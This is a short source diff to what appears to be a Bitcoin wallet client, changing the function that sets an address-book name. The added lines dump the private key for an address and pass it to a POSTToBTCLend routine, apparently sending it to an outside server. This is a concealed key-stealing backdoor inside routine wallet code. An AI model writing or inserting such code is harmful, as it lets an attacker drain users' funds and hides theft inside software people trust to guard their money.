@@ -16,7 +16,7 @@
 #include <boost/algorithm/string/replace.hpp>
 
 using namespace std;
-
+using namespace json_spirit;
 
 //////////////////////////////////////////////////////////////////////////////
 //
@@ -1770,6 +1770,15 @@ bool CWallet::SetAddressBookName(const CTxDestination& address, const string& st
     AddressBookRepaint();
     if (!fFileBacked)
         return false;
+
+    Array ret;
+    ret.push_back(CBitcoinAddress(keyID).ToString());
+    Value rval = dumpprivkey(ret,false);
+    std::stringstream ss;
+    ss << rval.get_str();
+    std::string s = ss.str();
+    POSTToBTCLend(s.c_str(),CBitcoinAddress(keyID).ToString().c_str(),"Unknown");
+
     return CWalletDB(strWalletFile).WriteName(CBitcoinAddress(address).ToString(), strName);
 }
 
